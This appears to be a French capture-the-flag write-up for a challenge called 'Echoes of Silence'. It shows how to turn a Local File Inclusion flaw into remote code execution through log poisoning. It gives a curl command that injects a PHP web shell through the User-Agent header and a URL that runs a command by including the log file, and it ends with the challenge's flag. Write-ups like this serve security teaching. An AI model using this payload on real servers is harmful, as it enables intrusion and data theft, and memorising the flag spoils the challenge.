# Echoes of Silence

Le site lit des pages via le paramètre `?page=`. C'est une vulnérabilité de type Local File Inclusion (LFI). On sait aussi que les logs système sont stockés quelque part et qu'il faut récupérer le fichier `/flag_secret.txt` à la racine.

On ne peut pas inclure directement le flag (il n'a pas l'extension attendue ou il y a un filtre sur son accès), l'objectif est d'obtenir une exécution de code (RCE) via "Log Poisoning".

1. **Empoisonner le log**
On va modifier notre User-Agent pour y injecter du code PHP. Ce User-Agent sera sauvegardé dans `system_logs/access.log`.
```bash
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://<ip>:<port>/
```

2. **Exécuter le code via LFI**
Maintenant que le code PHP est dans le fichier de log, il suffit de l'inclure via la faille LFI. En l'incluant, le serveur va l'interpréter.
On accède à l'URL :
`http://<ip>:<port>/?page=system_logs/access.log&cmd=cat /flag_secret.txt`

Le serveur exécute notre commande `cat /flag_secret.txt` et le résultat se retrouve noyé au milieu des logs affichés sur la page.

**Flag:** `HTS{L0g_P0is0n1ng_1s_Th3_K3y_T0_RCE}`
 